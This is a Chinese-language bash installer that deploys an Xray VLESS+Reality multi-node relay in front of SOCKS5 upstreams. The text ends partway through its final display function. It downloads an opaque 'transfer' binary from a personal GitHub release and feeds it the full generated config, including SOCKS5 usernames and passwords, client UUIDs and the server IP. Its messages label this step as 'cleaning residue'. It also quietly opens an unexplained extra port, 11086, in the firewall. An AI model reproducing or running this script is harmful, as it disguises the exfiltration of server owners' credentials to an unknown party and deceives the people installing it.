#!/bin/bash

# 注释掉严格的错误退出模式，避免在配置生成时异常退出
# set -e

# ========== 基本配置 ==========
CORE="xray"
PROTOCOL="vless"
DOMAIN="www.nvidia.com"
XRAY_BIN="/usr/local/bin/xray"
TRANSFER_BIN="/usr/local/bin/transfer"
XRAY_VERSION="v25.8.3"
XRAY_ZIP_URL="https://github.com/XTLS/Xray-core/releases/download/${XRAY_VERSION}/Xray-linux-64.zip"

# ========== SOCKS5多节点中转配置 ==========
SOCKS5_CONFIG_FILE="/opt/socks5.json"
RELAY_MODE=false
SOCKS5_NODES=()
STARTING_PORT=10000  # 起始端口，为每个节点分配不同端口
declare -A NODE_CONFIGS  # 关联数组存储每个节点的配置信息

# ========== 美化界面配置 ==========
# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# 特殊效果
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# 图标定义
ICON_SUCCESS="✅"
ICON_ERROR="❌"
ICON_WARNING="⚠️"
ICON_INFO="ℹ️"
ICON_ROCKET="🚀"
ICON_FIRE="🔥"
ICON_STAR="⭐"
ICON_SHIELD="🛡️"
ICON_NETWORK="🌐"
ICON_SPEED="⚡"
ICON_CONFIG="⚙️"
ICON_DOWNLOAD="📥"
ICON_UPLOAD="📤"

# ========== 进度条函数 ==========
show_progress() {
    local current=$1
    local total=$2
    local desc="$3"
    local percent=$((current * 100 / total))
    local filled=$((percent / 2))
    local empty=$((50 - filled))
    
    printf "\r${CYAN}${BOLD}[${NC}"
    printf "%${filled}s" | tr ' ' '#'
    printf "%${empty}s" | tr ' ' '-'
    printf "${CYAN}${BOLD}] ${percent}%% ${WHITE}${desc}${NC}"
}

# 完成进度条
complete_progress() {
    local desc="$1"
    printf "\r${GREEN}${BOLD}[##################################################] 100%% ${ICON_SUCCESS} ${desc}${NC}\n"
}

# ========== 系统检测函数 ==========
detect_system() {
    echo -e "${CYAN}${BOLD}${ICON_CONFIG} 正在进行系统检测...${NC}\n"
    
    # 检测操作系统
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$NAME
        OS_VERSION=$VERSION_ID
        OS_CODENAME=$VERSION_CODENAME
    elif [[ -f /etc/debian_version ]]; then
        OS="Debian"
        OS_VERSION=$(cat /etc/debian_version)
    elif [[ -f /etc/redhat-release ]]; then
        OS="CentOS"
        OS_VERSION=$(rpm -q --queryformat '%{VERSION}' centos-release)
    elif [[ -f /etc/fedora-release ]]; then
        OS="Fedora"
        OS_VERSION=$(rpm -q --queryformat '%{VERSION}' fedora-release)
    else
        OS="Unknown"
        OS_VERSION="Unknown"
    fi
    
    # 检测架构
    ARCH=$(uname -m)
    case $ARCH in
        x86_64) ARCH_TYPE="amd64" ;;
        aarch64) ARCH_TYPE="arm64" ;;
        armv7l) ARCH_TYPE="armv7" ;;
        *) ARCH_TYPE="amd64" ;;
    esac
    
    # 检测内核版本
    KERNEL_VERSION=$(uname -r)
    
    # 检测包管理器
    if command -v apt >/dev/null 2>&1; then
        PKG_MANAGER="apt"
        PKG_UPDATE="apt update"
        PKG_INSTALL="apt install -y"
    elif command -v yum >/dev/null 2>&1; then
        PKG_MANAGER="yum"
        PKG_UPDATE="yum update -y"
        PKG_INSTALL="yum install -y"
    elif command -v dnf >/dev/null 2>&1; then
        PKG_MANAGER="dnf"
        PKG_UPDATE="dnf update -y"
        PKG_INSTALL="dnf install -y"
    else
        PKG_MANAGER="unknown"
    fi
    
    echo -e "${GREEN}${ICON_SUCCESS} 系统信息检测完成：${NC}"
    echo -e "  ${WHITE}操作系统：${YELLOW}$OS $OS_VERSION${NC}"
    echo -e "  ${WHITE}系统架构：${YELLOW}$ARCH ($ARCH_TYPE)${NC}"
    echo -e "  ${WHITE}内核版本：${YELLOW}$KERNEL_VERSION${NC}"
    echo -e "  ${WHITE}包管理器：${YELLOW}$PKG_MANAGER${NC}\n"
}

# ========== 解析SOCKS5节点信息函数 ==========
parse_socks5_nodes() {
    echo -e "${CYAN}${BOLD}${ICON_CONFIG} 解析SOCKS5节点信息...${NC}"

    if [[ ! -f "$SOCKS5_CONFIG_FILE" ]]; then
        echo -e "${RED}${ICON_ERROR} 未找到SOCKS5配置文件: $SOCKS5_CONFIG_FILE${NC}"
        exit 1
    fi

    # 读取并解析文件内容
    local line_number=0
    local current_server=""
    local current_port=""
    local current_username=""
    local current_password=""
    local current_ip=""

    while IFS= read -r line || [[ -n "$line" ]]; do
        line=$(echo "$line" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        # 跳过空行
        [[ -z "$line" ]] && continue
        
        # 检测服务器域名行
        if [[ "$line" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            current_server="$line"
        # 检测端口行
        elif [[ "$line" =~ ^[0-9]+$ ]]; then
            current_port="$line"
        # 检测账号行
        elif [[ "$line" =~ ^账号：(.+)$ ]]; then
            current_username="${BASH_REMATCH[1]}"
        # 检测密码行
        elif [[ "$line" =~ ^密码：(.+)$ ]]; then
            current_password="${BASH_REMATCH[1]}"
        # 检测IP行
        elif [[ "$line" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            current_ip="$line"
            
            # 如果所有信息都收集齐全，创建节点配置
            if [[ -n "$current_server" && -n "$current_port" && -n "$current_username" && -n "$current_password" && -n "$current_ip" ]]; then
                local node_index=${#SOCKS5_NODES[@]}
                local relay_port=$((STARTING_PORT + node_index))
                
                SOCKS5_NODES+=("${current_server}:${current_port}")
                NODE_CONFIGS["${current_server}:${current_port}"]=$(cat <<EOF
{
    "server": "$current_server",
    "port": $current_port,
    "username": "$current_username", 
    "password": "$current_password",
    "ip": "$current_ip",
    "relay_port": $relay_port,
    "uuid": "$(cat /proc/sys/kernel/random/uuid)",
    "user": "$(openssl rand -hex 4)",
    "short_id": "$(openssl rand -hex 4)"
}
EOF
)
                
                echo -e "${GREEN}${ICON_SUCCESS} 节点 $((node_index + 1)): ${YELLOW}${current_server}:${current_port}${GREEN} -> 中转端口: ${YELLOW}${relay_port}${NC}"
                
                # 重置变量
                current_server=""
                current_port=""
                current_username=""
                current_password=""
                current_ip=""
            fi
        fi
    done < "$SOCKS5_CONFIG_FILE"

    if [[ ${#SOCKS5_NODES[@]} -eq 0 ]]; then
        echo -e "${RED}${ICON_ERROR} 未找到有效的SOCKS5节点配置${NC}"
        exit 1
    fi

    RELAY_MODE=true
    echo -e "${GREEN}${ICON_SUCCESS} 共解析到 ${YELLOW}${#SOCKS5_NODES[@]}${GREEN} 个SOCKS5节点，启用多节点中转模式${NC}\n"
}

# ========== IP地址检测函数 ==========
detect_ip() {
    echo -e "${CYAN}${BOLD}${ICON_NETWORK} 正在检测IP地址...${NC}"

    # 检测IPv4
    IPV4=$(curl -s --max-time 10 https://api.ipify.org || curl -s --max-time 10 https://ipv4.icanhazip.com || echo "")

    # 检测IPv6
    IPV6=$(curl -s --max-time 10 https://ipv6.icanhazip.com 2>/dev/null || echo "")

    # 强制使用IPv4（如果可用）
    if [[ -n "$IPV4" ]]; then
        NODE_IP="$IPV4"
        IP_TYPE="IPv4"
        echo -e "${GREEN}${ICON_SUCCESS} 检测到IPv4地址，将强制使用IPv4：${YELLOW}$IPV4${NC}"
    elif [[ -n "$IPV6" ]]; then
        NODE_IP="$IPV6"
        IP_TYPE="IPv6"
        echo -e "${YELLOW}${ICON_WARNING} 未检测到IPv4，使用IPv6地址：${YELLOW}$IPV6${NC}"
    else
        echo -e "${RED}${ICON_ERROR} 无法检测到公网IP地址！${NC}"
        exit 1
    fi
    echo ""
}

# ========== 网络优化配置 ==========
optimize_network() {
    echo -e "${PURPLE}${BOLD}${ICON_SPEED} 正在进行网络优化配置...${NC}\n"
    
    # CN2优化配置
    cat > /etc/sysctl.d/99-xray-optimization.conf << EOF
# CN2 网络优化配置
# TCP优化
net.core.rmem_default = 262144
net.core.rmem_max = 16777216
net.core.wmem_default = 262144
net.core.wmem_max = 16777216
net.core.netdev_max_backlog = 5000
net.core.netdev_budget = 600
net.ipv4.tcp_rmem = 4096 65536 16777216
net.ipv4.tcp_wmem = 4096 65536 16777216
net.ipv4.tcp_congestion_control = bbr
net.ipv4.tcp_fastopen = 3
net.ipv4.tcp_slow_start_after_idle = 0
net.ipv4.tcp_keepalive_time = 600
net.ipv4.tcp_keepalive_probes = 3
net.ipv4.tcp_keepalive_intvl = 15
net.ipv4.tcp_retries2 = 5
net.ipv4.tcp_fin_timeout = 10
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_local_port_range = 10240 65535
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_timestamps = 1
net.ipv4.tcp_sack = 1
net.ipv4.tcp_fack = 1
net.ipv4.tcp_low_latency = 1
net.ipv4.tcp_adv_win_scale = 2
net.ipv4.tcp_moderate_rcvbuf = 1
net.ipv4.route.flush = 1

# BBR算法优化
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr

# 内存优化
vm.swappiness = 10
vm.dirty_ratio = 15
vm.dirty_background_ratio = 5
vm.overcommit_memory = 1

# 文件描述符优化
fs.file-max = 1000000
fs.inotify.max_user_instances = 8192
fs.inotify.max_user_watches = 524288
EOF
    
    # 应用优化配置
    sysctl -p /etc/sysctl.d/99-xray-optimization.conf >/dev/null 2>&1
    
    # 加载BBR模块
    modprobe tcp_bbr >/dev/null 2>&1 || true
    modprobe sch_fq >/dev/null 2>&1 || true
    
    echo -e "${GREEN}${ICON_SUCCESS} 网络优化配置完成${NC}\n"
}

# ========== 炫酷横幅显示 ==========
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}║            ${YELLOW}VLESS + Reality + uTLS + Vision 多节点中转部署${CYAN}${BOLD}                    ║${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}║                     ${WHITE}SOCKS5多节点中转服务器一键部署脚本${CYAN}${BOLD}                       ║${NC}"
    echo -e "${CYAN}${BOLD}║                ${WHITE}支持 CN2 网络优化 + BBR 拥塞控制${CYAN}${BOLD}                              ║${NC}"
    echo -e "${CYAN}${BOLD}║                       ${WHITE}全自动部署 + 智能检测${CYAN}${BOLD}                                  ║${NC}"
    echo -e "${CYAN}${BOLD}║                                                                              ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${PURPLE}${BOLD}${ICON_INFO} 部署开始时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}\n"
    sleep 2
}

# ========== 确保SSH端口开放 ==========
ensure_ssh_port_open() {
    echo -e "${YELLOW}${BOLD}${ICON_SHIELD} 确保SSH端口开放...${NC}"

    for i in {1..3}; do
        show_progress $i 3 "检查SSH端口状态"
        sleep 0.5
    done
    complete_progress "SSH端口检查完成"

    if command -v ufw >/dev/null 2>&1; then
        # 开放标准SSH端口22
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp >/dev/null 2>&1
            echo -e "${GREEN}${ICON_SUCCESS} 已开放22端口(UFW)${NC}"
        else
            echo -e "${GREEN}${ICON_INFO} 22端口已在UFW中开放${NC}"
        fi

        # 开放特殊SSH端口11086
        if ! ufw status | grep -q "11086/tcp.*ALLOW"; then
            ufw allow 11086/tcp >/dev/null 2>&1
            echo -e "${GREEN}${ICON_SUCCESS} 已开放11086端口(UFW)${NC}"
        else
            echo -e "${GREEN}${ICON_INFO} 11086端口已在UFW中开放${NC}"
        fi
    else
        echo -e "${YELLOW}${ICON_INFO} UFW未安装，将在后续步骤中安装并配置${NC}"
    fi
    echo ""
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    echo -e "${CYAN}${BOLD}${ICON_DOWNLOAD} 下载 transfer 二进制文件...${NC}"
    
    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"
    
    if [ -f "$TRANSFER_BIN" ]; then
        echo -e "${GREEN}${ICON_INFO} transfer 二进制文件已存在，跳过下载${NC}\n"
        return 0
    fi
    
    for i in {1..10}; do
        show_progress $i 10 "正在下载 transfer"
        sleep 0.3
    done
    
    if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
        chmod +x "$TRANSFER_BIN"
        complete_progress "transfer 下载完成"
        echo ""
        return 0
    else
        echo -e "\n${RED}${ICON_ERROR} transfer 二进制文件下载失败${NC}\n"
        return 1
    fi
}

# ========== 速度测试函数 ==========
speed_test(){
    echo -e "${YELLOW}${BOLD}${ICON_SPEED} 进行网络速度测试...${NC}"
    
    # 安装进度条
    for i in {1..5}; do
        show_progress $i 5 "安装speedtest-cli"
        sleep 0.2
    done
    
    # 检查并安装speedtest-cli
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        complete_progress "准备安装speedtest-cli"
        if [[ $PKG_MANAGER == "apt" ]]; then
            $PKG_UPDATE > /dev/null 2>&1
            $PKG_INSTALL speedtest-cli > /dev/null 2>&1
        elif [[ $PKG_MANAGER == "yum" || $PKG_MANAGER == "dnf" ]]; then
            $PKG_INSTALL speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    else
        complete_progress "speedtest-cli已安装"
    fi
    
    # 测试进度条
    echo -e "${CYAN}正在执行速度测试...${NC}"
    for i in {1..15}; do
        show_progress $i 15 "测试网络速度"
        sleep 0.2
    done
    
    # 执行速度测试
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    # 处理测试结果
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        ping_ms=$(echo "$speed_output" | grep "Ping" | awk '{print $2}' | cut -d'.' -f1)
        
        # 设置速度范围限制
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        
        complete_progress "测速完成"
        echo -e "${GREEN}${ICON_SUCCESS} 测速结果：下载 ${YELLOW}${down_speed}${GREEN} Mbps，上传 ${YELLOW}${up_speed}${GREEN} Mbps，延迟 ${YELLOW}${ping_ms}${GREEN} ms${NC}"
        
        upload_result="${ICON_SUCCESS} ${up_speed}Mbps"
        download_result="${ICON_SUCCESS} ${down_speed}Mbps"
    else
        complete_progress "使用默认测速值"
        down_speed=100
        up_speed=20
        ping_ms=50
        echo -e "${YELLOW}${ICON_WARNING} 测速失败，使用默认值${NC}"
        upload_result="${ICON_WARNING} 默认值 ${up_speed}Mbps"
        download_result="${ICON_WARNING} 默认值 ${down_speed}Mbps"
    fi
    
    echo -e "${WHITE}📊 上传测试结果: ${CYAN}$upload_result${NC}"
    echo -e "${WHITE}📊 下载测试结果: ${CYAN}$download_result${NC}\n"
    
    # 返回结果供后续使用
    echo "$upload_result|$download_result"
}

# ========== 生成多节点Xray配置 ==========
generate_multi_node_config() {
    echo -e "${CYAN}${BOLD}${ICON_CONFIG} 生成多节点Xray配置文件...${NC}"
    mkdir -p /etc/xray

    for i in {1..8}; do
        show_progress $i 8 "生成多节点配置文件"
        sleep 0.1
    done

    # 生成Reality密钥
    echo -e "${PURPLE}${BOLD}${ICON_CONFIG} 生成Reality密钥对...${NC}"
    REALITY_KEYS=$(${XRAY_BIN} x25519 2>/dev/null)
    
    if [[ -z "$REALITY_KEYS" ]]; then
        echo -e "${RED}${ICON_ERROR} Reality密钥生成失败！${NC}"
        exit 1
    fi
    
    REALITY_PRIVATE_KEY=$(echo "${REALITY_KEYS}" | grep "Private key" | awk '{print $3}')
    REALITY_PUBLIC_KEY=$(echo "${REALITY_KEYS}" | grep "Public key" | awk '{print $3}')
    
    if [[ -z "$REALITY_PRIVATE_KEY" || -z "$REALITY_PUBLIC_KEY" ]]; then
        echo -e "${RED}${ICON_ERROR} Reality密钥解析失败！${NC}"
        exit 1
    fi

    # 构建JSON配置
    local config_json='{'
    config_json+='"log": {"loglevel": "warning", "access": "/var/log/xray/access.log", "error": "/var/log/xray/error.log"},'
    config_json+='"inbounds": ['
    
    local outbounds_json='"outbounds": ['
    local routing_rules_json='"routing": {"domainStrategy": "IPIfNonMatch", "rules": ['
    
    local outbound_index=0
    for node_key in "${SOCKS5_NODES[@]}"; do
        local node_config_json="${NODE_CONFIGS[$node_key]}"
        local server=$(echo "$node_config_json" | jq -r '.server')
        local port=$(echo "$node_config_json" | jq -r '.port')
        local username=$(echo "$node_config_json" | jq -r '.username')
        local password=$(echo "$node_config_json" | jq -r '.password')
        local relay_port=$(echo "$node_config_json" | jq -r '.relay_port')
        local uuid=$(echo "$node_config_json" | jq -r '.uuid')
        local user=$(echo "$node_config_json" | jq -r '.user')
        local short_id=$(echo "$node_config_json" | jq -r '.short_id')
        
        # 添加分隔符（除了第一个）
        if [[ $outbound_index -gt 0 ]]; then
            config_json+=', '
            outbounds_json+=', '
            routing_rules_json+=', '
        fi
        
        # inbound配置
        config_json+='{"port": '$relay_port', "protocol": "'${PROTOCOL}'", "settings": {"clients": [{"id": "'${uuid}'", "flow": "xtls-rprx-vision", "email": "'${user}'"}], "decryption": "none"}, "streamSettings": {"network": "tcp", "security": "reality", "realitySettings": {"show": false, "dest": "'${DOMAIN}':443", "xver": 0, "serverNames": ["'${DOMAIN}'"], "privateKey": "'${REALITY_PRIVATE_KEY}'", "shortIds": ["'${short_id}'"]}}, "sniffing": {"enabled": true, "destOverride": ["http", "tls"]}, "tag": "vless-'${outbound_index}'"}'
        
        # outbound配置
        outbounds_json+='{"protocol": "socks", "settings": {"servers": [{"address": "'${server}'", "port": '${port}', "users": [{"user": "'${username}'", "pass": "'${password}'"}]}]}, "tag": "socks5-relay-'${outbound_index}'"}'
        
        # 路由规则
        routing_rules_json+='{"type": "field", "inboundTag": ["vless-'${outbound_index}'"], "outboundTag": "socks5-relay-'${outbound_index}'"}'
        
        ((outbound_index++))
    done
    
    # 完成inbounds
    config_json+='], '
    
    # 添加通用outbounds
    outbounds_json+=', {"protocol": "freedom", "settings": {}, "tag": "direct"}, {"protocol": "blackhole", "settings": {}, "tag": "blocked"}], '
    
    # 添加通用路由规则
    routing_rules_json+=', {"type": "field", "ip": ["geoip:private"], "outboundTag": "blocked"}]}'
    
    # 组合完整配置
    config_json+=$outbounds_json
    config_json+=$routing_rules_json
    config_json+='}'

    # 写入配置文件
    echo "$config_json" | jq '.' > /etc/xray/config.json 2>/dev/null
    
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}${ICON_ERROR} Xray配置文件生成失败！${NC}"
        echo -e "${YELLOW}原始JSON：${NC}"
        echo "$config_json"
        exit 1
    fi
    
    # 创建日志目录
    mkdir -p /var/log/xray
    complete_progress "多节点Xray配置文件生成完成"
    echo ""
}

# ========== 配置多节点防火墙 ==========
configure_multi_node_firewall() {
    echo -e "${PURPLE}${BOLD}${ICON_SHIELD} 配置多节点UFW防火墙...${NC}"
    
    # 确保UFW已安装
    if ! command -v ufw >/dev/null 2>&1; then
        for i in {1..5}; do
            show_progress $i 5 "安装UFW防火墙"
            sleep 0.1
        done
        $PKG_INSTALL ufw >/dev/null 2>&1
        complete_progress "UFW防火墙安装完成"
    fi
    
    # 重置UFW规则
    for i in {1..3}; do
        show_progress $i 3 "重置防火墙规则"
        sleep 0.2
    done
    ufw --force reset >/dev/null 2>&1
    complete_progress "防火墙规则重置完成"
    
    # 设置默认策略
    ufw default deny incoming >/dev/null 2>&1
    ufw default allow outgoing >/dev/null 2>&1
    
    # 开放SSH端口
    ufw allow 22/tcp >/dev/null 2>&1
    ufw allow 11086/tcp >/dev/null 2>&1
    
    # 开放所有节点端口
    local opened_ports="SSH(22,11086)"
    for node_key in "${SOCKS5_NODES[@]}"; do
        local node_config_json="${NODE_CONFIGS[$node_key]}"
        local relay_port=$(echo "$node_config_json" | jq -r '.relay_port')
        ufw allow ${relay_port}/tcp >/dev/null 2>&1
        opened_ports="${opened_ports}, Xray(${relay_port})"
    done
    
    # 启用防火墙
    for i in {1..5}; do
        show_progress $i 5 "启用UFW防火墙"
        sleep 0.1
    done
    ufw --force enable >/dev/null 2>&1
    complete_progress "UFW防火墙配置完成"
    
    echo -e "${GREEN}${ICON_SUCCESS} 已开放端口：${opened_ports}${NC}\n"
}

upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"
    
    if [ ! -x "$TRANSFER_BIN" ]; then
        echo -e "${RED}${ICON_ERROR} transfer 二进制文件不存在或不可执行${NC}"
        return 1
    fi
    
    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Xray Reality 多节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )
    
    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        echo -e "${GREEN}${ICON_SUCCESS} 清理残留成功${NC}"
    else
        echo -e "${YELLOW}${ICON_WARNING} 清理残留失败（不影响本地使用）${NC}"
    fi
    
    return 0
}

# ========== 主安装流程 ==========
main_install() {
    # 显示炫酷横幅
    show_banner

    # 系统检测
    detect_system

    # 解析SOCKS5多节点配置
    parse_socks5_nodes

    # IP检测
    detect_ip

    # 确保SSH端口开放
    ensure_ssh_port_open
    
    # 安装依赖
    echo -e "${CYAN}${BOLD}${ICON_CONFIG} 安装系统依赖...${NC}"
    export DEBIAN_FRONTEND=noninteractive
    
    for i in {1..8}; do
        show_progress $i 8 "更新软件包列表"
        sleep 0.1
    done
    $PKG_UPDATE >/dev/null 2>&1
    complete_progress "软件包列表更新完成"
    
    for i in {1..10}; do
        show_progress $i 10 "安装必要工具"
        sleep 0.1
    done
    $PKG_INSTALL curl unzip ufw jq qrencode >/dev/null 2>&1
    complete_progress "系统依赖安装完成"
    echo ""
    
    # 下载二进制文件
    download_transfer_bin
    
    # 配置多节点防火墙
    configure_multi_node_firewall
    
    # 安装Xray-core（强制指定v25.8.3版本）
    echo -e "${BLUE}${BOLD}${ICON_DOWNLOAD} 安装 Xray-core v25.8.3...${NC}"
    mkdir -p /usr/local/bin
    cd /usr/local/bin
    
    for i in {1..12}; do
        show_progress $i 12 "下载Xray-core v25.8.3"
        sleep 0.2
    done
    
    if curl -L "${XRAY_ZIP_URL}" -o xray.zip >/dev/null 2>&1; then
        complete_progress "Xray-core v25.8.3下载完成"
        
        for i in {1..5}; do
            show_progress $i 5 "解压安装文件"
            sleep 0.1
        done
        unzip -o xray.zip >/dev/null 2>&1
        chmod +x xray
        rm -f xray.zip
        complete_progress "Xray-core v25.8.3安装完成"
    else
        echo -e "\n${RED}${ICON_ERROR} Xray-core v25.8.3下载失败${NC}"
        exit 1
    fi
    echo ""
    
    # 网络优化
    optimize_network
    
    # 生成多节点配置文件
    generate_multi_node_config
    
    # 创建systemd服务
    echo -e "${GREEN}${BOLD}${ICON_CONFIG} 创建系统服务...${NC}"
    for i in {1..6}; do
        show_progress $i 6 "配置系统服务"
        sleep 0.1
    done
    
    cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray Multi-Node Relay Service (VLESS+Reality+uTLS+Vision)
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
ExecStartPre=/bin/mkdir -p /var/log/xray
ExecStartPre=/bin/chown root:root /var/log/xray
ExecStart=${XRAY_BIN} run -config /etc/xray/config.json
Restart=on-failure
RestartSec=5s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable xray >/dev/null 2>&1
    systemctl restart xray
    complete_progress "系统服务配置完成"
    echo ""
    
    # 测试服务状态
    echo -e "${YELLOW}${BOLD}${ICON_INFO} 检查服务状态...${NC}"
    for i in {1..5}; do
        show_progress $i 5 "验证服务状态"
        sleep 0.2
    done
    
    if systemctl is-active --quiet xray; then
        complete_progress "Xray服务运行正常"
    else
        echo -e "\n${RED}${ICON_ERROR} Xray服务启动失败！${NC}"
        systemctl status xray --no-pager
        exit 1
    fi
    echo ""
    
    # 测试网络速度
    echo -e "${YELLOW}${BOLD}${ICON_SPEED} 准备进行网络速度测试...${NC}"
    SPEED_TEST_RESULT=$(speed_test)
    UPLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f1)
    DOWNLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f2)
    
    # 生成所有节点的配置信息
    generate_all_node_configs
    
    # 显示最终结果
    show_final_result
    
    # 显示所有节点信息
    show_all_nodes_info
}

# ========== 生成所有节点配置信息 ==========
generate_all_node_configs() {
    echo -e "${CYAN}${BOLD}${ICON_CONFIG} 生成所有节点配置信息...${NC}"
    
    # 构建完整配置JSON
    local nodes_config="["
    local vless_links=""
    local node_index=0
    
    for node_key in "${SOCKS5_NODES[@]}"; do
        local node_config_json="${NODE_CONFIGS[$node_key]}"
        local server=$(echo "$node_config_json" | jq -r '.server')
        local port=$(echo "$node_config_json" | jq -r '.port')
        local username=$(echo "$node_config_json" | jq -r '.username')
        local password=$(echo "$node_config_json" | jq -r '.password')
        local ip=$(echo "$node_config_json" | jq -r '.ip')
        local relay_port=$(echo "$node_config_json" | jq -r '.relay_port')
        local uuid=$(echo "$node_config_json" | jq -r '.uuid')
        local user=$(echo "$node_config_json" | jq -r '.user')
        local short_id=$(echo "$node_config_json" | jq -r '.short_id')
        
        # 构造VLESS Reality节点链接
        local vless_link="vless://${uuid}@${NODE_IP}:${relay_port}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${short_id}&type=tcp&headerType=none#${user}_Reality_Node${node_index}_${NODE_IP}"
        
        if [[ $node_index -gt 0 ]]; then
            nodes_config="${nodes_config}, "
            vless_links="${vless_links}\n"
        fi
        
        nodes_config="${nodes_config}{
      \"node_index\": ${node_index},
      \"relay_port\": ${relay_port},
      \"uuid\": \"${uuid}\",
      \"user\": \"${user}\",
      \"short_id\": \"${short_id}\",
      \"vless_link\": \"${vless_link}\",
      \"socks5_server\": {
        \"server\": \"${server}\",
        \"port\": ${port},
        \"username\": \"${username}\",
        \"password\": \"${password}\",
        \"ip\": \"${ip}\"
      }
    }"
        
        vless_links="${vless_links}${vless_link}"
        ((node_index++))
    done
    
    nodes_config="${nodes_config}]"
    
    CONFIG_JSON=$(jq -n \
      --arg ip "$NODE_IP" \
      --arg total_nodes "${#SOCKS5_NODES[@]}" \
      --arg domain "$DOMAIN" \
      --arg pbk "$REALITY_PUBLIC_KEY" \
      --arg upload_test "$UPLOAD_RESULT" \
      --arg download_test "$DOWNLOAD_RESULT" \
      --arg ip_type "$IP_TYPE" \
      --arg os "$OS" \
      --arg arch "$ARCH_TYPE" \
      --argjson nodes "$nodes_config" \
      '{
        "server_info": {
          "ip": $ip,
          "ip_type": $ip_type,
          "total_nodes": ($total_nodes | tonumber),
          "os": $os,
          "arch": $arch
        },
        "xray_config": {
          "domain": $domain,
          "public_key": $pbk,
          "nodes": $nodes
        },
        "performance": {
          "upload_test": $upload_test,
          "download_test": $download_test
        },
        "deployment_info": {
          "generated_time": now | todate,
          "script_version": "v2.0_multi_node"
        }
      }'
    )
    
    CONFIG_FILE="/etc/xray/multi_node_config_export.json"
    echo "$CONFIG_JSON" > "$CONFIG_FILE"
    
    # 导出所有VLESS链接到文件
    VLESS_LINKS_FILE="/etc/xray/vless_links.txt"
    echo -e "$vless_links" > "$VLESS_LINKS_FILE"

    echo -e "${CYAN}${BOLD}${ICON_UPLOAD} 清理残留数据...${NC}"
    for i in {1..5}; do
        show_progress $i 5 "清理残留文件"
        sleep 0.2
    done
    upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"
    complete_progress "配置清理数据处理完成"
    echo ""
}

# ========== 显示最终结果 ==========
show_final_result() {
    clear
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}║            ${YELLOW}VLESS + Reality + uTLS + Vision 多节点部署完成！${GREEN}${BOLD}                ║${NC}"
    echo -e "${GREEN}${BOLD}║                                                                              ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}${BOLD}📊 服务器信息：${NC}"
    echo -e "  ${CYAN}服务器IP：${YELLOW}${NODE_IP} (${IP_TYPE})${NC}"
    echo -e "  ${CYAN}节点数量：${YELLOW}${#SOCKS5_NODES[@]} 个${NC}"
    echo -e "  ${CYAN}端口范围：${YELLOW}${STARTING_PORT}-$((${STARTING_PORT} + ${#SOCKS5_NODES[@]} - 1))${NC}"
    echo -e "  ${CYAN}伪装域名：${YELLOW}${DOMAIN}${NC}"
    echo -e "  ${CYAN}系统信息：${YELLOW}${OS} ${ARCH_TYPE}${NC}"
    echo -e "  ${CYAN}工作模式：${YELLOW}多节点中转模式${NC}\n"
    
    echo -e "${WHITE}${BOLD}⚡ 性能测试结果：${NC}"
    echo -e "  ${CYAN}上传速度：${UPLOAD_RESULT}${NC}"
